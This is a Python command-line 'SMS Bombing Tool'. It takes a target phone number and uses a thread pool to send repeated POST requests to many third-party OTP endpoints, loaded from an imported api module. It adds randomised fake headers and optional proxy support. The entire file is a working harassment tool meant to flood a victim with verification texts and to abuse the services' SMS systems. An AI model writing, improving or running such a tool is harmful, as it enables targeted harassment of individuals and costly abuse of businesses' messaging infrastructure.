# Standard Libraries
import argparse  # Module for parsing command-line arguments
import concurrent.futures  # Module for parallel execution
import signal  # Module for signal handling
from datetime import datetime  # Module for handling dates and times
from os import _exit  # Module for exiting the program

# Third-Party Libraries
import requests  # HTTP library for making requests
from alive_progress import alive_bar  # Progress bar library
from colorama import init, Fore, Style  # Library for colored output
from fake_headers import Headers  # Library for generating fake HTTP headers

# Custom Module
from api import send_otp_requests  # Module for sending OTP requests


def parse_arguments():
    """
    Parse command-line arguments.
    """
    parser = argparse.ArgumentParser(description="SMS Bombing Tool")
    parser.add_argument("target", help="The target phone number")
    parser.add_argument(
        "-c",
        "--count",
        help="Number of times to bomb the target phone number (default is 1)",
        type=int,
        default=1,
    )
    parser.add_argument(
        "-t",
        "--threads",
        help="Number of concurrent threads to use for bombing (default is 5)",
        type=int,
        default=5,
    )
    parser.add_argument(
        "-v",
        "--verbose",
        help="Display additional information during the bombing process",
        action="store_true",
    )
    parser.add_argument(
        "-x",
        "--proxy",
        help="Set a proxy server for requests (http/https)",
    )

    args = parser.parse_args()

    return args.target, args.count, args.threads, args.verbose, args.proxy


def send_request(api_name, api_url, data, timeout, proxy=None):
    """
    Send HTTP request to the specified API.
    """
    headers = Headers()
    generated_headers = headers.generate()
    current_time = datetime.now().strftime(f"{Style.BRIGHT}%H:%M:%S{Style.NORMAL}")
    response = None

    try:
        response = requests.post(
            api_url,
            headers=generated_headers,
            json=data,
            timeout=timeout,
            proxies=proxy,
        )
        response.raise_for_status()

        return f"{Fore.YELLOW}[{current_time}] {Fore.GREEN}{Style.BRIGHT}[+] {api_name}{Style.NORMAL} => {Style.BRIGHT}OK"
    except requests.exceptions.RequestException as e:
        if hasattr(e, "response") and hasattr(e.response, "status_code"):
            error_code = e.response.status_code
        else:
            error_code = "Unknown"
        return f"{Fore.YELLOW}[{current_time}] {Fore.RED}{Style.BRIGHT}[-] {api_name}{Style.NORMAL} => {Style.BRIGHT}Error {error_code}"


def process_target(api, proxy):
    """
    Process the target API.
    """
    return send_request(api["name"], api["url"], api["data"], timeout=2.5, proxy=proxy)


def handle_sigint(signal, frame):
    """
    Handle SIGINT signal.
    """
    print(f"\n{Fore.YELLOW}{Style.BRIGHT}[!] User interrupted the process.")
    _exit(1)


def display_results(futures):
    """
    Print results of the bombing process.
    """
    results = [future.result() for future in futures]
    succeeded = [result for result in results if "OK" in result]
    failed = [result for result in results if "Error" in result]

    print(
        f"\n{Style.BRIGHT}{Fore.YELLOW}[?]{Fore.RESET} Succeeded: {Fore.GREEN}{len(succeeded)}, "
        f"{Style.BRIGHT}Failed: {Fore.RED}{len(failed)}"
    )


def main():
    """
    Main function to run the SMS bombing tool.
    """
    init(autoreset=True)

    signal.signal(signal.SIGINT, handle_sigint)
    target, count, threads, verbose, proxy = parse_arguments()
    proxy_dict = {"http": proxy, "https": proxy} if proxy else None

    if proxy:
        print(f"{Fore.MAGENTA}{Style.BRIGHT}[?] Using proxy: {proxy}")

    apis = send_otp_requests(target)

    with alive_bar(count * len(apis), theme="smooth") as progress_bar:
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [
                executor.submit(process_target, api, proxy_dict) for api in apis * count
            ]

            for future in concurrent.futures.as_completed(futures):
                progress_bar()
                result = future.result()
                if verbose:
                    if "OK" in result:
                        print(f"{Fore.GREEN}{result}")
                    else:
                        print(f"{Fore.RED}{result}")

    display_results(futures)
    print("SMS bombing completed successfully.")


if __name__ == "__main__":
    main()
